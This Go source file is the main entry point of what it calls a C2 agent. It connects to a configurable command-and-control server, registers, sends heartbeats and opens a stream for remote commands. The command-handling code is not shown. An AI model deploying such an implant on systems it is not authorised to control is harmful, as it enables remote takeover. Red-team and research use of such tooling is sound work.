package main

import (
	"flag"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"portal/pkg/agent"
)

func main() {
	// Parse command line flags
	serverAddr := flag.String("server", "localhost:50051", "C2 server address")
	debug := flag.Bool("debug", false, "Enable debug logging")
	flag.Parse()

	// Set up logging
	if *debug {
		log.SetFlags(log.LstdFlags | log.Lshortfile)
	} else {
		log.SetFlags(log.LstdFlags)
	}

	log.Printf("Starting C2 agent, connecting to server at %s", *serverAddr)

	// Create agent
	c2Agent := agent.NewC2Agent(*serverAddr)

	// Connect to server
	if err := c2Agent.Connect(); err != nil {
		log.Fatalf("Failed to connect to server: %v", err)
	}

	// Register with server
	if err := c2Agent.Register(); err != nil {
		log.Fatalf("Failed to register with server: %v", err)
	}

	// Start heartbeat (every 5 seconds)
	c2Agent.StartHeartbeat(5 * time.Second)

	// Start command stream
	if err := c2Agent.StartCommandStream(); err != nil {
		log.Fatalf("Failed to start command stream: %v", err)
	}

	// Wait for termination signal
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh

	log.Println("Received termination signal, shutting down...")
	c2Agent.Stop()
}